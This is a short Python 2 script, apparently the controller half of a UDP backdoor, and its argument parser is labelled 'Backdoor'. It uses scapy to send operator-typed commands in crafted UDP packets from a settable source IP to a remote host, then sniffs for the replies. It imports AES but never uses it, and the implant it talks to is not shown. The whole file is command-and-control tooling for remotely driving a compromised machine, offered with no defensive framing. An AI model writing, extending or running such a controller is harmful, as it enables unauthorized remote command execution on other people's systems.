import argparse
from scapy.all import *
from Crypto.Cipher import AES
from scapy.layers.inet import IP, UDP


#Argparse setup
parser = argparse.ArgumentParser(description="Backdoor")
parser.add_argument('-d', '--server_ip', dest='server_ip', help='Server IP', required=True)
parser.add_argument('-p', '--server_port', dest='server_port', help='Server Port', required=True)
parser.add_argument('-s', '--client_ip', dest='client_ip', help='Client IP', required=True)
parser.add_argument('-sp', '--client_port', dest='client_port', help='Client Port', required= True)
args = parser.parse_args()


def stp_filter(packet):
        print('in filter')
        print packet['Raw'].load
        return True



def main():


#Main command and display loop
    while 1:
            command = raw_input("Command to send:") + "#" + args.client_ip
            #print (command)
            packet = IP(dst=args.server_ip, src=args.client_ip)/UDP(sport=int(args.client_port), dport=int(args.server_port))/command
            print packet['Raw'].load
            send(packet)
            sniff(filter="udp and src port " + args.server_port + " and dst port " + args.client_port, stop_filter=stp_filter)

if __name__ == '__main__':
	main()